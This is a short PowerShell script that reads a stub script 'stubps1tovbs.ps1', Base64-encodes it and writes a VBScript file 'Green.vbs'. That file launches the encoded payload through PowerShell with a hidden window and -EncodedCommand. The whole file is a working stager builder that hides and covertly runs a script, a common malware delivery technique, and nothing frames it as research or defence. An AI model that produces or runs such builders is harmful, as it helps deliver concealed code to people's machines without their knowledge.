
$text = [IO.File]::ReadAllText("stubps1tovbs.ps1")
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$encoded = [Convert]::ToBase64String($bytes)

New-Item  -Name "Green.vbs" -ItemType "file" -Value "Set objShell = CreateObject(""Wscript.Shell"")`nobjShell.Run(""powershell -sta -NoExit -WindowStyle Hidden -EncodedCommand """"$encoded""""""),vbhide"